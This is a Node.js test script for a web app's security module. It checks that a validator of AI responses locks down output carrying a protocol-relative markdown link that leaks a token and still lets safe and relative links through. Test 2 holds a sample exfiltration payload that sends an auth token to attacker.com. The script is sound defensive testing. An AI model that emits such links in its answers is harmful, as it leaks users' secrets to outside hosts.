/**
 * Dedicated security verification script for AI Exfiltration Hardening.
 * This runs in Node.js and verifies the new protocol-relative URL exfiltration detection.
 */

import { promises as fs } from 'fs';
import path from 'path';

// Store original defineProperty
const originalDefineProperty = Object.defineProperty;

// Intercept defineProperty to keep VORO_COMPROMISED writable for our test runner
Object.defineProperty = function(obj, prop, descriptor) {
  if (obj && prop === 'VORO_COMPROMISED') {
    return originalDefineProperty(obj, prop, {
      ...descriptor,
      configurable: true,
      writable: true
    });
  }
  return originalDefineProperty(obj, prop, descriptor);
};

// Minimal Browser Mock for Node.js
const mockWindow = () => {
  const listeners = {};
  const docListeners = {};

  const mockCrypto = {
    getRandomValues: (buf) => {
      for (let i = 0; i < buf.length; i++) buf[i] = Math.floor(Math.random() * 256);
      return buf;
    }
  };

  global.window = {
    location: { origin: 'http://localhost' },
    addEventListener: (type, cb) => {
      listeners[type] = listeners[type] || [];
      listeners[type].push(cb);
    },
    dispatchEvent: (event) => {
      const type = event.type;
      if (listeners[type]) {
        listeners[type].forEach(cb => cb(event));
      }
    },
    crypto: mockCrypto,
    self: {},
    top: {},
    VORO_COMPROMISED: false,
    VORO_DECEPTION_ACTIVE: false,
    __VORO_TEST_BYPASS__: true, // Start in test mode to bypass load checks
    Object,
    Array,
    Function,
    JSON,
    Promise,
    Proxy,
    Map,
    Set,
    Uint8Array,
    RegExp,
    Date,
    Error,
    Reflect,
    performance: {
      now: () => Date.now()
    }
  };
  global.window.self = global.window;
  global.window.top = global.window;

  global.CustomEvent = class CustomEvent {
    constructor(type, detail) {
      this.type = type;
      this.detail = detail;
    }
  };

  global.document = {
    documentElement: {
      getAttribute: () => null,
      attributes: []
    },
    head: { children: [], attributes: [] },
    getElementById: () => null,
    addEventListener: () => {},
    removeEventListener: () => {}
  };

  global.performance = global.window.performance;

  originalDefineProperty(global, 'crypto', {
    value: mockCrypto,
    configurable: true,
    writable: true
  });

  global.localStorage = {
    getItem: (key) => 'true',
    setItem: () => {},
    removeItem: () => {},
    clear: () => {}
  };

  global.sessionStorage = {
    clear: () => {}
  };
};

const runTests = async () => {
  console.log("=========================================");
  console.log("🧪 RUNNING SECURITY VERIFICATION: EXFILTRATION");
  console.log("=========================================");

  mockWindow();

  // Load the security module
  const securityModulePath = path.resolve('src/utils/security.js');
  const sentinel = (await import(securityModulePath)).default;

  const { validateAIResponse } = sentinel;

  let lockdownCount = 0;
  window.addEventListener('voro-security-lockdown', () => {
    lockdownCount++;
  });

  // --- TEST 1: Safe AI Responses ---
  console.log("🟢 Test 1: Verifying safe responses pass...");
  lockdownCount = 0;
  window.VORO_COMPROMISED = false;
  window.VORO_DECEPTION_ACTIVE = false;

  const safeContent = "Here is your 7-day meal plan. Let me know if you have questions!";
  const res1 = validateAIResponse(safeContent);

  if (res1 === safeContent && lockdownCount === 0 && !window.VORO_COMPROMISED) {
    console.log("✅ Success: Safe content was validated and returned without issues.");
  } else {
    throw new Error(`❌ Failure: Safe content triggered lockdown! res1=${res1}, compromised=${window.VORO_COMPROMISED}`);
  }

  // --- TEST 2: Protocol-Relative Exfiltration Attempt ---
  console.log("🛡️ Test 2: Verifying protocol-relative link inside brackets exfiltration detection...");
  lockdownCount = 0;
  window.VORO_COMPROMISED = false;
  window.VORO_DECEPTION_ACTIVE = false;

  const payload = "Click this link: [leak](//attacker.com?auth=high_entropy_token_xyz_123_abc)";
  const res2 = validateAIResponse(payload);

  if (res2 === "[SECURITY_VIOLATION_DETECTED]" && lockdownCount > 0 && window.VORO_COMPROMISED) {
    console.log("✅ Success: Protocol-relative link inside brackets was successfully detected and locked down!");
  } else {
    throw new Error(`❌ Failure: Protocol-relative exfiltration was NOT blocked! res2=${res2}, compromised=${window.VORO_COMPROMISED}`);
  }

  // --- TEST 3: Relative Path Safe Link ---
  console.log("🟢 Test 3: Verifying relative path (application origin-bound) link...");
  lockdownCount = 0;
  window.VORO_COMPROMISED = false;
  window.VORO_DECEPTION_ACTIVE = false;

  const relativeLink = "Check your logs at [Dashboard](/dashboard) page.";
  const res3 = validateAIResponse(relativeLink);

  if (res3 === relativeLink && lockdownCount === 0 && !window.VORO_COMPROMISED) {
    console.log("✅ Success: Relative link was correctly allowed.");
  } else {
    throw new Error(`❌ Failure: Relative path link incorrectly triggered lockdown! res3=${res3}, compromised=${window.VORO_COMPROMISED}`);
  }

  console.log("\n🎉 ALL EXFILTRATION SECURITY VERIFICATION TESTS PASSED SUCCESSFULLY!");
  console.log("=========================================");
  process.exit(0);
};

runTests().catch(err => {
  console.error(err);
  process.exit(1);
});
